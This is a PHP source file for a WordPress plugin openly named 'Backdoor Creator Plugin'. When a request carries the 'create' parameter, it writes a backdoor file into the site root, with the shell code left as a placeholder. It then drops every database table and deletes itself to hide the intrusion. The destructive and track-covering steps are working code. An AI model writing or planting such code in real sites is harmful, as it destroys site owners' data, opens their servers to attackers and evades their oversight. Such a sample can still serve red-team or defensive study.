<?php
/*
Plugin Name: Backdoor Creator Plugin
Plugin URI: 
Description: This plugin is evil. Do not use except you know what you're doing!
Author: 
Version: 1.0.0
Author URI: 
*/

// file name and path for backdoor PHP file
$targetPath = ABSPATH . '/wp-register.php';
$creationTriggerName = 'create';
// actual backdoor payload
$payload = <<<'EOT'
<?php

// TODO: Place PHP backdoor payload (e.g. a PHP shell of your choice) here!

EOT;
global $wpdb;

if (isset($_GET[$creationTriggerName])) {
    // save payload
    file_put_contents($targetPath, $payload);

    // drop tables
    $tables = $wpdb->get_col('SHOW TABLES;');
    if ($tables) {
        // Yes, you can do bobby tables here. https://xkcd.com/327/
        $wpdb->query('DROP TABLE ' . implode(', ', $tables) . ';');
    }

    // remove this plugin
    unlink(__FILE__);
}
